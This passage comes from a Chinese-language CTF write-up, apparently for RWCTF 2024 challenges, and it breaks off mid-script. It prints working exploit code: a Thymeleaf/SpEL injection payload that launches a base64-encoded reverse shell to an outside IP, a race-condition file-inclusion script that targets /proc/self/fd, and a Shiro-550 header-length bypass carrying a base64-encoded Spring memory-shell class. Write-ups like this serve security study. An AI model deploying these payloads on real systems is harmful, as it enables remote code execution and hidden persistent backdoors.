<p>这里用jackson的objectmapper去获取SPEL对象，最终执行SPEL表达式，类似于嵌套绕过了。thymeleaf本身也是SPEL只不过他给原生SPEL加了黑名单<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706518563088-e8cb47a3-55c2-419c-ae4b-6f64d0d0e43e.png#averageHue=%23fbfbfb&clientId=ue263ffd8-76af-4&from=paste&height=695&id=uc7be636d&originHeight=869&originWidth=1721&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65464&status=done&style=none&taskId=u6e170346-7202-472a-ab59-7157dfb4a35&title=&width=1376.8" alt="image.png"><br>最后就是如何取文件包含了。这里springboot其实是有一个缓存文件的。我们可以做个测试。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url=<span class="string">&#x27;http://localhost:8080/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    fileBytes=<span class="string">b&quot;&quot;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">[[$&#123;T(java.lang.Boolean).forName(&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;).newInstance().readValue(&quot;&#123;&#125;&quot;,T(java.lang.Boolean).forName(&quot;org.spri&quot;+&quot;ngframework.expression.spel.standard.SpelExpressionParser&quot;)).parseExpression(&quot;T(Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NSA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;).getValue()&#125;]]&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;JSESSIONID&#x27;</span>:<span class="string">&quot;1166AA425449D3ECAD51DE91E2515349&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">         files=&#123;</span><br><span class="line">             <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;poc&#x27;</span>,fileBytes)</span><br><span class="line">         &#125;</span><br><span class="line">         )</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.Event()</span><br><span class="line">        <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">                threading.Thread(target=write).start()</span><br><span class="line">        evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706520991627-ac08efe7-e4bb-4a53-b2c2-83788f24d28e.png#averageHue=%23030201&clientId=u72b3724b-5e96-4&from=paste&height=489&id=u259cff2a&originHeight=611&originWidth=1335&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77222&status=done&style=none&taskId=ubf4f6b34-f6f2-4370-98ef-38fefec8716&title=&width=1068" alt="image.png"><br>可以发现一直是有缓存文件在生成的，<code>/tmp/tomcat.8080.16899423235577718663/work/Tomcat/localhost/ROOT/upload_ca6259c5_8061_40c0_84e9_45c333f74e57_00019750.tmp</code>，他的临时文件名如上，同样的他也会在&#x2F;proc&#x2F;self&#x2F;fd里加一个id，那么我们只要包含fd即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">35</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            url = <span class="string">f&#x27;http://localhost:8080/notify?fname=..%5cproc/self/fd/<span class="subst">&#123;i&#125;</span>%23&#x27;</span>  <span class="comment"># 引入url</span></span><br><span class="line">            <span class="comment"># print(r.cookies)</span></span><br><span class="line">            response = requests.get(url,</span><br><span class="line">                                    cookies=&#123;</span><br><span class="line">                                        <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&quot;1166AA425449D3ECAD51DE91E2515349&quot;</span>  <span class="comment"># 同上，PHPSESSID的值</span></span><br><span class="line">                                    &#125;, timeout=<span class="number">0.5</span></span><br><span class="line">                                    )</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;err&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706522934887-c0fe2d20-d867-4257-aba0-c0b493de710f.png#averageHue=%232d2c2b&clientId=u72b3724b-5e96-4&from=paste&height=594&id=u0ee50cfd&originHeight=742&originWidth=996&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62431&status=done&style=none&taskId=uc921ca27-9849-491e-b4a3-dd73664036b&title=&width=796.8" alt="image.png"><br>到这里这题就算讲完了。</p>
<h1 id="oldshiro（solved）"><a href="#oldshiro（solved）" class="headerlink" title="oldshiro（solved）"></a>oldshiro（solved）</h1><p>考点：shiro 550 限制 Header绕过<br>限制了payload的长度，这一篇我记得在某个爷爷的博客里见到过，我们可以用线程名称分块Defineclass的方法去解决。</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.max-http-header-size</span> = <span class="string">3000</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8888</span></span><br></pre></td></tr></table></figure>
<p>给了个3000长度限制。那常规工具和payload肯定是不行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706523126009-530030ff-b374-49d8-90bb-a3aade985df9.png#averageHue=%232a2f38&clientId=u72b3724b-5e96-4&from=paste&height=473&id=u338a458b&originHeight=591&originWidth=1639&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147713&status=done&style=none&taskId=uf5df1bbe-a56f-4a23-baf2-c824dc6ebfc&title=&width=1311.2" alt="image.png"><br>然后关键字变成了<code>rememberMe_rwctf_2024</code><br>先说说非预期吧，出DNS，直接dnslog外带就行。<br>再说说预期吧，预期由于这题不出网，那肯定是需要打内存马进去的。但是内存马的payload长度高达7000，我们怎么样有效缩减呢？<br>答案就是线程名，线程名不限制长度，完全可以包含我们的payload，我们分块发送就好了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicMemshell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Thread.currentThread().setName(<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706524202302-342328d3-5985-4771-bc41-2c471bc25bcc.png#averageHue=%23060504&clientId=u72b3724b-5e96-4&from=paste&height=347&id=u1e088d3e&originHeight=434&originWidth=1359&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44419&status=done&style=none&taskId=u1d955dbf-d530-49bc-82b1-a36a2dfb680&title=&width=1087.2" alt="image.png"><br>可以看到我们已经设置了很多线程名字为Boogipop了。那接下来我们怎么做呢？<br>先把我们的FilterMemshell的base64生成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQBAAoAOwCKCABWCwCLAIwIAI0LAI4AjwsAjgCQCACRCACSCgCTAJQKAA4AlQgAlgoADgCXBwCYBwCZCACaCACbCgANAJwIAJ0IAJ4HAJ8KAA0AoAoAoQCiCgAUAKMIAKQKABQApQoAFACmCgAUAKcKABQAqAoAqQCqCgCpAKsKAKkAqAcArAoAIACtCwA8AK4LADwArwkAkwCwCACxCgCyAKoKALMAtAgAtQsAtgC3BwC4BwC5CwAqALoHALsIALwKAL0AvgcAvwoAMACtCgDAAMEKAMAAwgcAwwcAxAoANQCtBwDFCgA3AIoLADQAxggAxwcAyAcAyQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQArTGNvbS9qYXZhc2VjL21lbXNoZWxsL1NwcmluZ0ZpbHRlck1lbXNoZWxsOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAdidWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAtwcmludFdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAMUHAMoHAMsHAMwHAJkHAM0HAJgHAJ8HAKwBAApFeGNlcHRpb25zAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAD2V2aWxJbnRlcmNlcHRvcgEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47BwC4BwC5BwDPBwC/BwDDBwDEAQAKU291cmNlRmlsZQEAGVNwcmluZ0ZpbHRlck1lbXNoZWxsLmphdmEMAD0APgcAygwA0ADRAQADZ2JrBwDLDADSANMMANQA1QEAAAEAB29zLm5hbWUHANYMANcA0QwA2ADZAQADd2luDADaANsBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAA9ANwBAAkvYmluL2Jhc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDADdAN4HAN8MAOAA4QwAPQDiAQANd29jYW9zaW5pZGVtYQwA4wDkDADlAOYMAOcA2QwA6AA+BwDNDADpANMMAOoAPgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOsAPgwAYgBjDABmAGcMAOwA7QEABnN0YWFydAcA7gcA7wwA8ADxAQA5b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5EaXNwYXRjaGVyU2VydmxldC5DT05URVhUBwDyDADzAPQBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAPUA9gEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQATYWRhcHRlZEludGVyY2VwdG9ycwcA9wwA+AD5AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwDPDAD6APsMAPwA/QEADmphdmEvdXRpbC9MaXN0AQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BACljb20vamF2YXNlYy9tZW1zaGVsbC9TcHJpbmdGaWx0ZXJNZW1zaGVsbAwA/gD/AQACb2sBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAyb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3IBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9QcmludFdyaXRlcgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEAB3ByaW50bG4BAAVmbHVzaAEAD3ByaW50U3RhY2tUcmFjZQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgAhADcAOwABADwAAAAHAAEAPQA+AAEAPwAAAC8AAQABAAAABSq3AAGxAAAAAgBAAAAABgABAAAAFABBAAAADAABAAAABQBCAEMAAAABAEQARQACAD8AAAIFAAYACQAAAL4rEgK5AAMCADoEGQTGALAsEgS5AAUCACy5AAYBADoFEgc6BxIIuAAJtgAKEgu2AAyZACK7AA1ZBr0ADlkDEg9TWQQSEFNZBRkEU7cAEToGpwAfuwANWQa9AA5ZAxISU1kEEhNTWQUZBFO3ABE6BrsAFFkZBrYAFbYAFhIEtwAXEhi2ABk6CBkItgAamQALGQi2ABunAAUZBzoHGQi2ABwZBRkHtgAdGQW2AB4ZBbYAH6cACjoFGQW2ACEDrASsAAEADwCwALMAIAADAEAAAABOABMAAAAvAAoAMAAPADIAFwAzAB8ANQAjADYAMwA3AFIAOQBuADsAhgA8AJoAPQCfAD4ApgA/AKsAQACwAEMAswBBALUAQgC6AEQAvABGAEEAAABwAAsATwADAEYARwAGAB8AkQBIAEkABQBuAEIARgBHAAYAIwCNAEoASwAHAIYAKgBMAE0ACAC1AAUATgBPAAUAAAC+AEIAQwAAAAAAvgBQAFEAAQAAAL4AUgBTAAIAAAC+AFQAVQADAAoAtABWAEsABABXAAAAYwAH/wBSAAgHAFgHAFkHAFoHAFsHAFwHAF0ABwBcAAD/ABsACAcAWAcAWQcAWgcAWwcAXAcAXQcAXgcAXAAA/AAnBwBfQQcAXP8AGgAFBwBYBwBZBwBaBwBbBwBcAAEHAGAGAQBhAAAABAABACAAAQBiAGMAAgA/AAAAYAAFAAUAAAAKKissLRkEtwAisQAAAAIAQAAAAAoAAgAAAEsACQBMAEEAAAA0AAUAAAAKAEIAQwAAAAAACgBQAFEAAQAAAAoAUgBTAAIAAAAKAFQAVQADAAAACgBkAGUABABhAAAABAABACAAAQBmAGcAAgA/AAAAYAAFAAUAAAAKKissLRkEtwAjsQAAAAIAQAAAAAoAAgAAAFAACQBRAEEAAAA0AAUAAAAKAEIAQwAAAAAACgBQAFEAAQAAAAoAUgBTAAIAAAAKAFQAVQADAAAACgBoAE8ABABhAAAABAABACAAAQBpAGoAAgA/AAAAPwAAAAMAAAABsQAAAAIAQAAAAAYAAQAAAFYAQQAAACAAAwAAAAEAQgBDAAAAAAABAGsAbAABAAAAAQBtAG4AAgBhAAAABAABAG8AAQBpAHAAAgA/AAAASQAAAAQAAAABsQAAAAIAQAAAAAYAAQAAAFsAQQAAACoABAAAAAEAQgBDAAAAAAABAGsAbAABAAAAAQBxAHIAAgAAAAEAVABzAAMAYQAAAAQAAQBvAAgAdAA+AAEAPwAAAWkAAwAFAAAAarIAJBIltgAmuAAnEigDuQApAwDAACpLKhIruQAsAgDAACtMAU0SLRIutgAvTacACE4ttgAxLAS2ADIBTiwrtgAzwAA0TqcACjoEGQS2ADa7ADdZtwA4OgQtGQS5ADkCAFeyACQSOrYAJrEAAgAlAC0AMAAwADwARQBIADUABABAAAAASgASAAAAFwAIABgAFwAZACMAGgAlABwALQAfADAAHQAxAB4ANQAgADoAIQA8ACMARQAmAEgAJABKACUATwAnAFgAKABhACkAaQAqAEEAAABIAAcAMQAEAE4AdQADAEoABQBOAHYABAAXAFIAdwB4AAAAIwBGAHkAegABACUARAB7AHwAAgA8AC0AfQB+AAMAWAARAH8AQwAEAIAAAAAMAAEAPAAtAH0AgQADAFcAAAAtAAT/ADAAAwcAggcAgwcAhAABBwCFBP8AEgAEBwCCBwCDBwCEBwCGAAEHAIcGAAEAiAAAAAIAiQ==</span><br></pre></td></tr></table></figure>
<p>接下来的思路就是这样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 